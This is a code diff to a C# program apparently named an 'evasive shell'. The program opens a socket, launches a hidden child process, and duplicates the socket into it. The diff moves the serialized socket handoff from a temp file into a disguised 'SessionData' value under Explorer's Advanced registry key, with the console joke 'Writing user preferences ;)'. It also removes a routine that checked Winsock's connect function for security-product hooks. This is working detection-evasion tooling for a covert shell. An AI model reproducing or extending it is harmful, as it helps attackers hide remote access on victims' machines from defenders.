@@ -5,6 +5,7 @@
   using System.Net.Sockets;
   using System.Runtime.InteropServices;
   using System.Text;
+  using Microsoft.Win32;
   using SocketHelpers;
 
   public class Program
@@ -156,9 +157,7 @@
 
     public static async Task Main(string[] args)
     {
-      if (File.Exists("C:\\Temp\\socketinfo.bin"))
-        File.Delete("C:\\Temp\\socketinfo.bin");
-
+      Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SessionData", string.Empty, RegistryValueKind.String);
 
       Helpers.InitializeWSA();
       var sockAddrIn = new sockaddr_in();
@@ -173,15 +172,6 @@
       Console.WriteLine("Socket established.");
       var protocolInfo = new WSAPROTOCOL_INFO();
 
-      uint nonBlockingMode = 1;
-      int ret = WSAIoctl(socket, FIONBIO, ref nonBlockingMode, sizeof(uint), IntPtr.Zero, 0, out int bytesReturned, IntPtr.Zero, IntPtr.Zero);
-
-      if (ret != 0)
-        await Console.Out.WriteLineAsync("WSAIoctl failed");
-      
-      WSAConnect(socket, ref sockAddrIn, Marshal.SizeOf(sockAddrIn), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
-      //connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
-
       STARTUPINFO startupInfo = new STARTUPINFO();
       Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
       startupInfo.cb = Marshal.SizeOf(startupInfo);
@@ -190,38 +180,22 @@
       PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
       CreateProcessA(null, @"EvasiveShell_SocketConnection.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
 
-      WSADuplicateSocket(socket, pinfo.dwProcessId, ref protocolInfo);
-      Console.WriteLine("Socket dupicated");
+      Helpers.PrintLastError(nameof(CreateProcessA));
+
+      Console.WriteLine("Process created - duplicating socket");
+
+      string registryValue = string.Empty;
+
+      uint pid = pinfo.dwProcessId;
+      WSADuplicateSocket(socket, pid, ref protocolInfo);
+      Console.WriteLine("Socket duplicated.");
+      Console.WriteLine("Writing user preferences ;)");
       var serialized = SerializeProtocolInfo(protocolInfo);
 
-      if (!Directory.Exists("C:\\Temp"))
-        Directory.CreateDirectory("C:\\Temp");
+      Console.WriteLine("Connecting socket");
+      connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
 
-      File.WriteAllBytes("C:\\Temp\\socketinfo.bin", serialized);
-    }
-
-    private static bool DetectHooks()
-    {
-      IntPtr dll = LoadLibrary("Ws2_32.dll");
-
-      if (dll == IntPtr.Zero)
-        return false;
-
-      IntPtr functionAddress = GetProcAddress(dll, nameof(connect));
-
-      if (functionAddress == IntPtr.Zero)
-      {
-        Console.WriteLine("Function address konnte nicht gelesn werden.");
-        return false;
-      }
-
-      var bytes = new byte[16];
-      ReadProcessMemory(Process.GetCurrentProcess().Handle, functionAddress, bytes, bytes.Length, out int bytesRead);
-
-      foreach (var item in bytes)
-        Console.WriteLine(item);
-
-      return true;
+      Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SessionData", Convert.ToBase64String(serialized), RegistryValueKind.String);
     }
 
     private static byte[] SerializeProtocolInfo(WSAPROTOCOL_INFO protocolInfo)
